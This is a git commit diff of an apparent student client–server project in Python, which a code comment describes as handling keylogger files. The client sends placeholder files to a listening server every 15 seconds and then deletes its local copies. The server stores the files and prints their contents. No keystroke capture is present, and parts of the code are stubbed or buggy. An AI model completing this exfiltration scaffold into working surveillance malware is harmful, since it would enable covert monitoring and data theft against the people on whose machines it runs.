d996a684d554d6f7900c430a0ee38fcebc7eb328
Salla Diop <sdiop61@myges.fr>
2024-02-25 01:43:41 +0100

    sent files SRV-CLT

--- Projet/CLT.py
+++ Projet/CLT.py
@@ -1,3 +1,4 @@
+import os
 import socket
 import uuid
 import configparser
@@ -9,7 +10,7 @@ SERVER_PORT = 12345
 BUFFER_SIZE = 1024
 CLIENT_CONFIG_FILE = "client_config.ini"
 IP_CLIENT = None
-
+BUFFER_SIZE = 1024
 COUNT = 1
 
 #array with created keylogger file still existing
@@ -17,19 +18,37 @@ FILE = []
 
 configFile = configparser.ConfigParser()
 
+def getOS():
+    pass
+
+def getIP():
+    pass
+
+
+
 def writeFile():
     global COUNT
     global FILE
     nameFile = f"{getID()}_{COUNT}.txt"
     try:
-        with open(nameFile, "w") as f:
+        with open(nameFile, "wb") as f:
             COUNT += 1
             FILE.append(nameFile)
-            f.write("TEST")
+            f.write(b"TEST")
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"An error occurred during writing file: {e}")
 
-
+def deleteFile(nameFile):
+    global FILE
+    print("A file is going to be deleted..")
+    try:
+        os.remove(nameFile)
+        FILE.pop(0)
+        print(f"File '{nameFile}' has been deleted successfully\n")
+    except FileNotFoundError:
+        print(f"File '{nameFile}' has not been found")
+    except Exception as e:
+        print(f"An error occurred while deleting the file: {e}")
 
 
 def setID():
@@ -39,12 +58,12 @@ def setID():
         with open(CLIENT_CONFIG_FILE, 'w') as file:
             configFile.write(file)
     except IOError as e:
-        print(f"Error writing to configuration file: {e}")
+        print(f"An error occurred while writing: {e}")
     except Exception as e:
-        print(f"An error occurred: {e}")
-    else:
-        print(f"[*] Assigned ID: {clientID}")
+        print(f"An error occurred setting ID: {e}")
+    print(f"[*] Assigned ID: {clientID}")
     return clientID
+
 
 def getID():
     try:
@@ -54,28 +73,50 @@ def getID():
         return setID()
 
 
-
+def sendFile(socket):
+    global FILE
+    print("A file is going to be sent to the server..")
+    try:
+        nameFile = FILE[0]
+        with open(nameFile, 'rb') as f:
+            fileToSent = f.read()
+        socket.sendall(f"{nameFile}\n".encode() + fileToSent)
+        print(f"The file '{nameFile}' has been sent to the server\n") 
+        return nameFile    
+    except Exception as e:
+        print(f"An error occurred while sending file: {e}")
 
 
 
 def connectionServer():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        while True:
-            try:
-                s.connect((SERVER_HOST, SERVER_PORT))
-                print("Client connected successfully to Server!")
-                break
-            except ConnectionRefusedError:
-                print("Server not available. Retrying in 10 seconds..")
-                time.sleep(10)
-        
-        id = getID().encode()
-        s.sendall(b"Hello, server! My ID is "+ id)
-        data = s.recv(1024)
+        try:
+            s.connect((SERVER_HOST, SERVER_PORT))
+            print("Client connected successfully to Server!\n")
 
-    print(f"Received {data!r}")
+            id = getID().encode()
+            s.sendall(id)
+            data = s.recv(BUFFER_SIZE)
+            print(f"Response from the SERVER : '{data.decode()}'\n")
+
+            while True:
+                nameFile = sendFile(s)
+                data = s.recv(BUFFER_SIZE)
+                print(f"Response from the SERVER : '{data.decode()}'\n")
+                deleteFile(nameFile)
+
+                print("Wait 15 seconds before sending new file to server\n")
+                time.sleep(15)
+        except ConnectionRefusedError:
+            print("Server not available. Retrying in 5 seconds..")
+            time.sleep(5)
+        except Exception as e:
+            print(f"An error occurred while connected to server: {e}")
+        
+        
 
 def main():
+    writeFile()
     connectionServer()
 
 
--- Projet/SRV.py
+++ Projet/SRV.py
@@ -8,41 +8,134 @@ import threading
 # Server configuration
 SERVER_HOST = '127.0.0.2'
 SERVER_PORT = 12345
+
 BUFFER_SIZE = 1024
+
 
 # Dictionary to store client IDs and connections
 CLIENT_FILE_DAY = {}
 
+#Array with all open ports
+PORTS = []
+
+def allOpenPorts():
+    pass
+
+def listenPort():
+    pass
+
+def closePort():
+    pass
+
+def closeAllPort():
+    pass
+
+def kill():
+    pass
+
+def readFile():
+    pass
+
+def help():
+    pass
+
+
+
+def addFileDirectory(IDClient, nameFile):
+    global CLIENT_FILE_DAY
+    if IDClient in CLIENT_FILE_DAY:
+        CLIENT_FILE_DAY[IDClient].append(nameFile)
+    else:
+        CLIENT_FILE_DAY[IDClient] = [nameFile]
+
+"""
+Display all files sent to SERVER coming from one Client in particular
+"""
+def displayFileClientDay(IDClient):
+    if IDClient in CLIENT_FILE_DAY:
+        filesClient = CLIENT_FILE_DAY[IDClient]
+        print(filesClient)
+    else:
+        print("ID Client has not been found\n")
+
+""""""
+
+#equivalent to '--show'
+def displayAllFileDay():
+    print("Listing all files received this connection:")
+    for IDClient, files in CLIENT_FILE_DAY.items():
+        print("Client ID:", IDClient)
+        print("Files:")
+        for nameFile in files:
+            print("\t", nameFile)
+    print("End listing all files\n")
+
+
+
+
 
 def receiveFile(data):
-    print("Receive a file from a client")
+    print("[*] Receive a file from a client")
 
 
 def inputServer(valueToPrint):
     print(f"SERVER > {valueToPrint}")
 
 
+def saveFile(IDClient, fileContent):
+    nameFile = "Test_File.txt"
+    try:
+        with open(nameFile, 'wb') as f:
+            f.write(fileContent)
+        print(f"File {nameFile} has been saved successfully\n")
+        readFile(nameFile)
+    except Exception as e:
+        print(f"An error occurred saving file : {e}")
+
+
+def readFile(fileName):
+    with open(fileName, 'rb') as f:
+        print("+++ BEGINNING +++")
+        file_contents = f.read()
+        print(file_contents.decode())
+        print("+++ END +++\n")
+
+
+
 def manageClient(clientSocket, address):
-    print(f"Accepted connection from {address}")
-
+    global CLIENT_FILE_DAY
+    print(f"[*] Accepted connection from {address}")
     IPClient = address[0]
-    while True:
-        data = clientSocket.recv(BUFFER_SIZE)
-        receiveFile(data)
-        if not data:
-            break
+    try:
+         IDClient = clientSocket.recv(BUFFER_SIZE)
+         print(f"ID client: {IDClient.decode()}\n")
+         clientSocket.sendall(b"ID client received")
+         while True:
+            data = clientSocket.recv(BUFFER_SIZE)
+            if not data:
+                break
 
-        clientSocket.sendall(data)
+            nameFile, fileContent = data.split(b"\n", 1)
+            nameFile = nameFile.decode()
+            addFileDirectory(IDClient, nameFile)
+            displayAllFileDay()
+            
+            saveFile(IDClient, fileContent)
+            clientSocket.sendall(b"File '" + nameFile + "' received") 
+    except ConnectionResetError:
+        print(f"[*] Connection from {IPClient} ({address}) closed unexpectedly.")
+    except Exception as e:
+        print(f"[*] An error occurred while receiving data: {e}")
 
     clientSocket.close()
-    print(f"Connection from ID {IPClient} ({address}) closed.")
+    print(f"[*] Connection from {IPClient} ({address}) closed.")
 
 
 def connectClients():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((SERVER_HOST, SERVER_PORT))
         s.listen(5)
-        print(f"Listening on {SERVER_HOST}:{SERVER_PORT}")
+        print(f"[*] Listening on {SERVER_HOST}:{SERVER_PORT}..")
 
         while True:
             # Accept a new connection from client
@@ -55,6 +148,7 @@ def connectClients():
 
 def main():
     connectClients()
+    pass
 
 if __name__ == "__main__":
     main()
